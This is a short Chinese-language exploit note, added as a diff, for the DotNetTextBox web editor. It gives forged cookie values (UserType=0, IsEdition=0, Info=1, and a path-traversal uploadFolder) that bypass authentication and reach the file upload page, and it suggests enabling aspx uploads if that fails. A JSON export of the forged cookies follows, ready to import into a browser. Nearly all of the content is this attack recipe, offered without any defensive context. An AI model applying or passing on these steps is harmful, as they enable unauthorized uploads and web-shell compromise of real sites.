@@ -1,0 +1,64 @@
+
+
+DotNetTextBox编辑器漏洞
+
+修改cookie为：
+
+cookie:UserType=0; IsEdition=0; Info=1; uploadFolder=../system_dntb/;
+
+之后浏览 xxx.com/system_dntb/uploadFile.aspx/uploadFile.aspx
+
+即可上传
+
+如不行 则在system_dntb/Advanced.aspx添加 aspx or别的类型
+
+
+
+[{
+    "domain": ".xxx.org",
+    "expirationDate": 1401960780,
+    "hostOnly": false,
+    "httpOnly": false,
+    "name": "UserType",
+    "path": "/",
+    "secure": false,
+    "session": false,
+    "storeId": "1",
+    "value": "0"
+},
+{
+    "domain": ".xxx.org",
+    "expirationDate": 1401960780,
+    "hostOnly": false,
+    "httpOnly": false,
+    "name": "IsEdition",
+    "path": "/",
+    "secure": false,
+    "session": false,
+    "storeId": "1",
+    "value": "0"
+},
+{
+    "domain": ".xxx.org",
+    "expirationDate": 1401960780,
+    "hostOnly": false,
+    "httpOnly": false,
+    "name": "Info",
+    "path": "/",
+    "secure": false,
+    "session": false,
+    "storeId": "1",
+    "value": "1"
+},
+{
+    "domain": ".xxx.org",
+    "expirationDate": 1401960780,
+    "hostOnly": false,
+    "httpOnly": false,
+    "name": "uploadFolder",
+    "path": "/",
+    "secure": false,
+    "session": false,
+    "storeId": "1",
+    "value": "../system_dntb/"
+}]
